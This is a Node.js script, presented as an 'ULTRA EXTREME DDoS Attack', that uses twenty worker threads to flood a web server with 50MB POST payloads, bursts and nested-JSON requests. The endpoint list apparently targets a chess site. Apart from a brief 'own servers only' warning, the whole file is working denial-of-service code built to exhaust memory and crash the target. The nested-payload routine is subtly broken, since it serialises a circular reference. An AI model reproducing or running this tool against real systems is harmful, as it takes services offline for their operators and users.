#!/usr/bin/env node

/**
 * ULTRA EXTREME DDoS Attack - Optimized for High-Memory Ubuntu Servers
 * WARNING: Only use against YOUR OWN servers for testing!
 * This creates MASSIVE memory pressure with 50MB+ payloads
 */

import http from 'http'
import { Worker, isMainThread, parentPort, workerData } from 'worker_threads'
import { URL } from 'url'

const TARGET_URL = process.env.TARGET_URL || 'http://127.0.0.1:3000'
const WORKERS = 20 // More workers for higher concurrency
const REQUESTS_PER_WORKER = 150 // Increased request rate
const DURATION = 180 // 3 minutes - longer attack
const PAYLOAD_SIZE_MB = 50 // 50MB payloads as suggested

if (isMainThread) {
    // Main thread - coordinate the attack
    console.log('💀💀💀 ULTRA EXTREME DDoS - 50MB PAYLOAD MODE 💀💀💀')
    console.log('═══════════════════════════════════════════════════════════')
    console.log(`🎯 Target: ${TARGET_URL}`)
    console.log(`👥 Workers: ${WORKERS}`)
    console.log(`⚡ Rate: ${WORKERS * REQUESTS_PER_WORKER} requests/second`)
    console.log(`💾 Payload Size: ${PAYLOAD_SIZE_MB}MB per request`)
    console.log(`💣 Total Data/sec: ${(WORKERS * REQUESTS_PER_WORKER * PAYLOAD_SIZE_MB) / 1000}GB/sec`)
    console.log(`⏱️  Duration: ${DURATION} seconds`)
    console.log(`🚀 Strategy: MASSIVE MEMORY EXHAUSTION (50MB PAYLOADS)`)
    console.log('═══════════════════════════════════════════════════════════\n')

    const workers = []
    const stats = {
        total: 0,
        success: 0,
        failed: 0,
        errors: 0,
        memoryExhausted: 0
    }

    let startTime = Date.now()

    // Create worker pool
    for (let i = 0; i < WORKERS; i++) {
        const worker = new Worker(new URL(import.meta.url), {
            workerData: { 
                id: i, 
                target: TARGET_URL,
                requestsPerSecond: REQUESTS_PER_WORKER,
                duration: DURATION,
                payloadSizeMB: PAYLOAD_SIZE_MB
            }
        })

        worker.on('message', (msg) => {
            if (msg.type === 'stats') {
                stats.total += msg.total
                stats.success += msg.success
                stats.failed += msg.failed
                stats.errors += msg.errors
                stats.memoryExhausted += msg.memoryExhausted || 0
            }
        })

        worker.on('error', (err) => {
            console.error(`❌ Worker ${i} error:`, err.message)
        })

        workers.push(worker)
    }

    // Display real-time stats with memory impact
    const statsInterval = setInterval(() => {
        const elapsed = (Date.now() - startTime) / 1000
        const rps = Math.round(stats.total / elapsed)
        const dataPerSec = ((stats.total * PAYLOAD_SIZE_MB) / elapsed).toFixed(2)
        
        console.log(`📊 Requests: ${stats.total} | Success: ${stats.success} | Failed: ${stats.failed} | RPS: ${rps} | Data: ${dataPerSec}MB/s`)
        
        if (stats.memoryExhausted > 0) {
            console.log(`   💀 Memory Exhaustion Detected: ${stats.memoryExhausted} times`)
        }
    }, 2000)

    // Stop attack after duration
    setTimeout(() => {
        clearInterval(statsInterval)
        workers.forEach(w => w.terminate())
        
        const totalTime = (Date.now() - startTime) / 1000
        const totalDataGB = ((stats.total * PAYLOAD_SIZE_MB) / 1024).toFixed(2)
        
        console.log('\n═══════════════════════════════════════════════════════════')
        console.log('💥 ATTACK COMPLETED')
        console.log(`⏱️  Duration: ${totalTime.toFixed(2)}s`)
        console.log(`📊 Total Requests: ${stats.total}`)
        console.log(`💾 Total Data Sent: ${totalDataGB}GB`)
        console.log(`✅ Successful: ${stats.success}`)
        console.log(`❌ Failed: ${stats.failed}`)
        console.log(`⚠️  Errors: ${stats.errors}`)
        console.log(`💀 Memory Exhaustion Events: ${stats.memoryExhausted}`)
        console.log(`⚡ Average RPS: ${Math.round(stats.total / totalTime)}`)
        console.log(`📈 Average Data Rate: ${((stats.total * PAYLOAD_SIZE_MB) / totalTime / 1024).toFixed(2)}GB/s`)
        console.log('═══════════════════════════════════════════════════════════')
        
        if (stats.failed > stats.success * 0.5) {
            console.log('🎯 LIKELY SERVER CRASH - High failure rate detected! 💀')
        }
        
        process.exit(0)
    }, DURATION * 1000)

} else {
    // Worker thread - execute attack with MASSIVE payloads
    const { id, target, requestsPerSecond, duration, payloadSizeMB } = workerData
    const targetUrl = new URL(target)
    
    let workerStats = {
        total: 0,
        success: 0,
        failed: 0,
        errors: 0,
        memoryExhausted: 0
    }

    // Generate a MASSIVE payload (50MB by default)
    function generateMassivePayload() {
        const oneMB = 'X'.repeat(1024 * 1024) // 1MB of X's
        return oneMB.repeat(payloadSizeMB) // Multiply to desired size
    }

    // Pre-generate some payloads to reduce CPU overhead
    console.log(`Worker ${id}: Generating ${payloadSizeMB}MB payload...`)
    const massivePayload = generateMassivePayload()
    console.log(`Worker ${id}: Payload ready! Starting attack...`)

    // Attack patterns optimized for memory exhaustion
    const attackPatterns = [
        // 1. Massive POST payload - primary weapon
        () => sendMassivePayload(targetUrl, massivePayload),
        // 2. Multiple large payloads in sequence
        () => sendBurstPayloads(targetUrl, massivePayload),
        // 3. Large JSON payload with nested structures
        () => sendNestedJsonPayload(targetUrl),
        // 4. Mixed payload types
        () => sendMixedPayload(targetUrl, massivePayload),
    ]

    function sendMassivePayload(url, payload) {
        return new Promise((resolve) => {
            const jsonPayload = JSON.stringify({
                attack: 'ultra-memory-exhaustion',
                data: payload,
                timestamp: Date.now(),
                workerId: id,
                size: `${payloadSizeMB}MB`
            })

            const options = {
                hostname: url.hostname,
                port: url.port || 3000,
                path: '/',
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                    'Content-Length': Buffer.byteLength(jsonPayload),
                    'User-Agent': `UltraDDoS-Worker-${id}`,
                    'X-Attack-Type': 'memory-exhaustion'
                },
                timeout: 5000
            }

            const req = http.request(options, (res) => {
                res.on('data', () => {})
                res.on('end', () => {
                    if (res.statusCode < 400) {
                        workerStats.success++
                    } else if (res.statusCode === 503 || res.statusCode === 507) {
                        workerStats.memoryExhausted++
                        workerStats.failed++
                    } else {
                        workerStats.failed++
                    }
                    resolve()
                })
            })

            req.on('error', (err) => {
                workerStats.errors++
                if (err.code === 'ECONNRESET' || err.code === 'ECONNREFUSED') {
                    workerStats.memoryExhausted++
                }
                resolve()
            })

            req.on('timeout', () => {
                workerStats.failed++
                req.destroy()
                resolve()
            })

            req.write(jsonPayload)
            req.end()
            workerStats.total++
        })
    }

    function sendBurstPayloads(url, payload) {
        return new Promise(async (resolve) => {
            // Send 3 massive payloads in rapid succession
            const promises = []
            for (let i = 0; i < 3; i++) {
                promises.push(sendMassivePayload(url, payload.substring(0, payloadSizeMB * 1024 * 1024 / 3)))
            }
            await Promise.all(promises)
            resolve()
        })
    }

    function sendNestedJsonPayload(url) {
        return new Promise((resolve) => {
            // Create deeply nested structure that's hard to garbage collect
            const createNestedObject = (depth, size) => {
                if (depth === 0) return 'X'.repeat(size)
                return {
                    level: depth,
                    data: 'X'.repeat(size),
                    nested: createNestedObject(depth - 1, size),
                    circular: null // Will create circular ref
                }
            }

            const nestedData = createNestedObject(100, 50000) // 100 levels deep
            nestedData.circular = nestedData // Circular reference

            const payload = JSON.stringify({
                type: 'nested-attack',
                data: nestedData,
                timestamp: Date.now()
            })

            const options = {
                hostname: url.hostname,
                port: url.port || 3000,
                path: '/api/user/login',
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                    'Content-Length': Buffer.byteLength(payload),
                    'User-Agent': `Nested-Attack-${id}`
                },
                timeout: 3000
            }

            const req = http.request(options, (res) => {
                res.on('data', () => {})
                res.on('end', () => {
                    workerStats.success++
                    resolve()
                })
            })

            req.on('error', () => {
                workerStats.errors++
                resolve()
            })

            req.on('timeout', () => {
                workerStats.failed++
                req.destroy()
                resolve()
            })

            req.write(payload)
            req.end()
            workerStats.total++
        })
    }

    function sendMixedPayload(url, payload) {
        return new Promise((resolve) => {
            // Mix large payload with resource requests
            const randomEndpoints = [
                '/',
                '/socket.io/',
                '/stockfish/stockfish.js',
                '/api/user/login',
                '/puzzle',
                '/preferences'
            ]
            
            const path = randomEndpoints[Math.floor(Math.random() * randomEndpoints.length)]
            
            const options = {
                hostname: url.hostname,
                port: url.port || 3000,
                path: path,
                method: 'POST',
                headers: {
                    'Content-Type': 'application/octet-stream',
                    'Content-Length': Buffer.byteLength(payload),
                    'User-Agent': `Mixed-Attack-${id}`
                },
                timeout: 4000
            }

            const req = http.request(options, (res) => {
                res.on('data', () => {})
                res.on('end', () => {
                    workerStats.success++
                    resolve()
                })
            })

            req.on('error', () => {
                workerStats.errors++
                resolve()
            })

            req.on('timeout', () => {
                workerStats.failed++
                req.destroy()
                resolve()
            })

            req.write(payload)
            req.end()
            workerStats.total++
        })
    }

    // Main attack loop
    const interval = 1000 / requestsPerSecond
    let requestCount = 0
    const maxRequests = requestsPerSecond * duration

    const attackLoop = setInterval(async () => {
        if (requestCount >= maxRequests) {
            clearInterval(attackLoop)
            parentPort.postMessage({ type: 'stats', ...workerStats })
            return
        }

        // Use weighted random selection (favor massive payloads)
        const rand = Math.random()
        let pattern
        if (rand < 0.7) {
            pattern = attackPatterns[0] // 70% massive payloads
        } else if (rand < 0.85) {
            pattern = attackPatterns[1] // 15% burst payloads
        } else if (rand < 0.95) {
            pattern = attackPatterns[2] // 10% nested payloads
        } else {
            pattern = attackPatterns[3] // 5% mixed payloads
        }
        
        pattern().catch(() => {})
        requestCount++

        // Send stats every 10 seconds
        if (requestCount % (requestsPerSecond * 10) === 0) {
            parentPort.postMessage({ type: 'stats', ...workerStats })
        }
    }, interval)

    // Additional burst mode - send extra massive payloads every 3 seconds
    setInterval(() => {
        for (let i = 0; i < 10; i++) {
            sendMassivePayload(targetUrl, massivePayload).catch(() => {})
        }
    }, 3000)
}
